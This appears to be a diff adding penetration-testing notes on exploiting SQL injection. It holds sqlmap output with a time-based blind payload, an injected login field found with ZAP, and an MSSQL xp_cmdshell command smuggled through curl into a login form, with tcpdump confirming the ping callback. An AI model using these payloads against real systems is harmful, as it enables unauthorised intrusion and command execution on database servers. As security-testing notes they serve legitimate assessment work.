@@ -67,3 +67,31 @@ Parameter: cId (GET)
     Payload: action=deleteCust&cId=123 AND 6730=BENCHMARK(5000000,MD5(0x4b555455))#
 ---
 [17:46:13] [INFO] the back-end DBMS is MySQL
+
+
+#Zapproxy
+#Loadup the site select the option open it in firefox (this should bring up the HID)
+#Scan the site if found SQLI
+#Check if you can execute commands or ping back or get a response as an output
+
+#ZAP will shoot out a message saying this input more then it should
+username=ZAP&password=ZAP&logintype=1+AND+1%3D1+--+&rememberme=ON&B1=LogIn
+
+#Check if you can execute commands run a ping
+#Open a listener send it a command
+#This will depend on the database
+
+#MSSQL
+EXEC+Xp_cmdshell+'ping+x.x.x.x';
+
+
+#Test with curl
+curl subdomain.domain.com/old/verify.asp -d "username=ZAP&password=ZAP&logintype=2;EXEC+Xp_cmdshell+'ping+x.x.x.x';&rememberme=ON&B1=LogIn"
+<head><title>Object moved</title></head>
+<body><h1>Object Moved</h1>This object may be found <a HREF="Welcome.asp">here</a>.</body>
+
+tcpdump -nni tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+17:22:31.579471 IP x.x.x.x > x.x.x.x: ICMP echo request, id 1, seq 1, length 40
+17:22:31.579546 IP x.x.x.x > x.x.x.x: ICMP echo reply, id 1, seq 1, length 40
